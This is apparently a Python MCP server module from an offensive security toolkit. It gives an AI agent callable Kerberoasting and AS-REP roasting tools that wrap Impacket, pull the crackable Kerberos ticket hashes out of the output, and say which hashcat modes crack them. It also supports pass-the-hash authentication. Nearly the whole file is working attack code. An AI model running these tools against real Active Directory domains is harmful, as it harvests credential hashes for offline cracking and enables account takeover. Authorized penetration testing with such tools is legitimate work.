"""AD/Kerberos exposure enumeration -- Kerberoasting and AS-REP roasting,
the two techniques active-directory-and-network-pivot already documents
by hand ("Kerberoasting/AS-REP roasting/pass-the-ticket/golden-silver
tickets... impacket assumed as a dependency"). This wraps Impacket's own
well-known scripts via subprocess (same tool_resolver.run_tool() pattern
nmap-mcp/sqlmap-mcp already use for their own external binaries) rather
than hand-rolling Kerberos protocol/ASN.1 ticket construction -- exactly
the same "use an established, battle-tested library instead of risky
from-scratch crypto/protocol code" reasoning aws-postexploit-mcp already
applies to boto3 vs. hand-rolled SigV4.

Deliberately scoped to enumeration + exposure-confirmation only, NOT
ticket forgery (golden/silver tickets, pass-the-ticket) -- Kerberoasting/
AS-REP roasting request a ticket and note whether it's crackable
offline, granting no new access and requiring no elevated privilege
beyond a valid domain account (often none at all for AS-REP roasting
against accounts with pre-auth disabled); ticket forgery grants
persistent domain-wide impersonation, a materially higher-impact
primitive this pass does not build.

Honest limitation, not glossed over: this repo has no live Impacket
install or Active Directory lab to exercise these subprocess
invocations end-to-end against (unlike aws/azure/gcp-postexploit-mcp's
REST-API calls, which were tested against real API wire shapes via
mocked HTTP/botocore.stub.Stubber). The exact binary names/flags below
are written to Impacket's long-stable, widely-documented CLI interface
(GetUserSPNs.py/GetNPUsers.py have kept this same interface shape for
years across impacket releases) with high confidence, and the
OUTPUT-PARSING logic (extracting crackable hash lines from Impacket's
own documented output format) is unit-tested against canned example
output -- but the subprocess invocation itself is "believed correct
per documentation," the same honest category tool_resolver.py's own
callers fall into for any external binary this repo doesn't ship or
control.

Password auth is piped via stdin (`input=` on subprocess.run, passed
through by tool_resolver.run_tool()'s **kwargs), not put on the argv --
Impacket's target-string format (domain/username[:password]) falls back
to an interactive getpass() prompt when the password segment is omitted,
which reads correctly from a piped stdin even without a real TTY. This
avoids a real, well-known exposure: any other local process can read
another process's argv (e.g. via /proc/<pid>/cmdline on Linux) for as
long as it's running, which a plaintext password embedded in the command
line would hand out for free. NTLM hash auth (-hashes LMHASH:NTHASH,
Impacket's own pass-the-hash flag) is offered as an alternative that
sidesteps the question entirely -- no plaintext credential ever exists
to protect.
"""

import os
import re
import shutil
import subprocess
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from tool_resolver import run_tool  # noqa: E402

from mcp.server.fastmcp import FastMCP

app = FastMCP("ad-recon-mcp")

# Both the modern (impacket>=0.10) console_scripts entry-point naming and
# the traditional examples/*.py script naming are tried, in that order --
# whichever the operator's own impacket install actually provides.
KERBEROAST_CANDIDATES = ["impacket-getuserspns", "impacket-GetUserSPNs", "GetUserSPNs.py"]
ASREPROAST_CANDIDATES = ["impacket-getnpusers", "impacket-GetNPUsers", "GetNPUsers.py"]

# Impacket's own hashcat-compatible output format for each ticket type --
# stable, documented, unchanged across releases.
KERBEROAST_HASH_RE = re.compile(r"\$krb5tgs\$23\$[^\s]+")
ASREPROAST_HASH_RE = re.compile(r"\$krb5asrep\$23\$[^\s]+")


def _find_binary(candidates: list[str]) -> str | None:
    for name in candidates:
        if shutil.which(name):
            return name
    return None


def _build_target(domain: str, username: str, password: str | None, ntlm_hash: str | None) -> tuple[str, str | None]:
    """Returns (target_string, stdin_input). If a plaintext password is
    given, it's NEVER placed in the target string -- the target omits it
    (triggering Impacket's own interactive getpass() fallback) and the
    password is returned separately to be piped via stdin instead. An
    ntlm_hash needs no such handling (it's passed via -hashes, a
    dedicated flag, not embedded in the target string either way)."""
    target = f"{domain}/{username}"
    if ntlm_hash:
        return target, None
    if password:
        return target, password + "\n"
    return target + ":", None  # no creds at all -- e.g. AS-REP roast with -no-pass


def kerberoast(domain: str, username: str, dc_ip: str,
               password: str | None = None, ntlm_hash: str | None = None) -> dict:
    """Request TGS tickets for every discovered SPN account and extract
    the resulting hashcat-crackable ($krb5tgs$23$...) hashes -- the
    actual value of a Kerberoast: knowing an SPN account exists is not
    the finding, a crackable ticket for it is. Requires a valid domain
    account (this account's own privilege level, not the target SPN
    account's) -- Kerberoasting works against any authenticated user by
    design, that's the point of the technique."""
    binary = _find_binary(KERBEROAST_CANDIDATES)
    if not binary:
        return {"error": f"none of {KERBEROAST_CANDIDATES} found on PATH -- pip install impacket"}

    target, stdin_input = _build_target(domain, username, password, ntlm_hash)
    args = [target, "-dc-ip", dc_ip, "-request"]
    if ntlm_hash:
        args += ["-hashes", f":{ntlm_hash}"]

    try:
        kwargs = {"timeout": 60}
        if stdin_input is not None:
            kwargs["input"] = stdin_input
        result = run_tool(binary, args, **kwargs)
    except FileNotFoundError:
        return {"error": f"{binary} not found on PATH -- pip install impacket"}
    except subprocess.TimeoutExpired:
        return {"error": f"{binary} timed out after 60s"}

    combined = (result.stdout or "") + (result.stderr or "")
    hashes = KERBEROAST_HASH_RE.findall(combined)
    return {"returncode": result.returncode, "crackable_hash_count": len(hashes),
            "crackable_hashes": hashes, "raw_output": combined}


def asreproast(domain: str, dc_ip: str, users_file: str | None = None, username: str | None = None) -> dict:
    """AS-REP roast: request an AS-REP for every account with Kerberos
    pre-authentication disabled (UF_DONT_REQUIRE_PREAUTH) and extract the
    resulting hashcat-crackable ($krb5asrep$23$...) hashes. Genuinely
    NO authentication is required for this technique against accounts
    that qualify -- -no-pass is always passed. Provide either
    username (check one specific account) or users_file (a path to a
    newline-separated username list -- build one from LDAP/recon output
    first; this tool doesn't enumerate the domain's user list itself)."""
    binary = _find_binary(ASREPROAST_CANDIDATES)
    if not binary:
        return {"error": f"none of {ASREPROAST_CANDIDATES} found on PATH -- pip install impacket"}
    if not username and not users_file:
        return {"error": "provide either username (one account) or users_file (a candidate list)"}

    target = f"{domain}/{username}" if username else f"{domain}/"
    args = [target, "-dc-ip", dc_ip, "-no-pass"]
    if users_file:
        args += ["-usersfile", users_file]

    try:
        result = run_tool(binary, args, timeout=60)
    except FileNotFoundError:
        return {"error": f"{binary} not found on PATH -- pip install impacket"}
    except subprocess.TimeoutExpired:
        return {"error": f"{binary} timed out after 60s"}

    combined = (result.stdout or "") + (result.stderr or "")
    hashes = ASREPROAST_HASH_RE.findall(combined)
    return {"returncode": result.returncode, "crackable_hash_count": len(hashes),
            "crackable_hashes": hashes, "raw_output": combined}


@app.tool()
def kerberoast_tool(domain: str, username: str, dc_ip: str,
                     password: str = "", ntlm_hash: str = "") -> str:
    """Kerberoasting: requests TGS tickets for every SPN account
    discoverable with this credential and extracts crackable
    ($krb5tgs$23$...) hashes for offline cracking (hashcat -m 13100).
    Requires a valid domain account -- any authenticated user, by
    design, not necessarily a privileged one. Pass password OR
    ntlm_hash, not both; ntlm_hash (pass-the-hash) is preferred when
    available since it avoids ever handling a plaintext credential at
    all. Wraps Impacket's GetUserSPNs.py -- pip install impacket if
    it's not already on PATH."""
    result = kerberoast(domain, username, dc_ip, password or None, ntlm_hash or None)
    if "error" in result:
        return f"Error: {result['error']}"
    if not result["crackable_hashes"]:
        return f"No crackable Kerberoast hashes found (returncode {result['returncode']})."
    lines = [f"🔴 {result['crackable_hash_count']} crackable Kerberoast hash(es) -- crack with hashcat -m 13100:"]
    lines.extend(f"  {h}" for h in result["crackable_hashes"])
    return "\n".join(lines)


@app.tool()
def asreproast_tool(domain: str, dc_ip: str, users_file: str = "", username: str = "") -> str:
    """AS-REP roasting: requests an AS-REP for every account with
    Kerberos pre-authentication disabled and extracts crackable
    ($krb5asrep$23$...) hashes for offline cracking (hashcat -m 18200).
    Genuinely NO authentication is required against accounts that
    qualify. Pass username to check one specific account, or users_file
    (a path to a newline-separated candidate list -- build this from
    LDAP/recon output first, this tool doesn't enumerate the domain's
    user list itself). Wraps Impacket's GetNPUsers.py."""
    result = asreproast(domain, dc_ip, users_file or None, username or None)
    if "error" in result:
        return f"Error: {result['error']}"
    if not result["crackable_hashes"]:
        return f"No crackable AS-REP hashes found (returncode {result['returncode']})."
    lines = [f"🔴 {result['crackable_hash_count']} crackable AS-REP hash(es) -- crack with hashcat -m 18200:"]
    lines.extend(f"  {h}" for h in result["crackable_hashes"])
    return "\n".join(lines)


if __name__ == "__main__":
    print("ad-recon-mcp starting...", file=sys.stderr)
    app.run(transport="stdio")
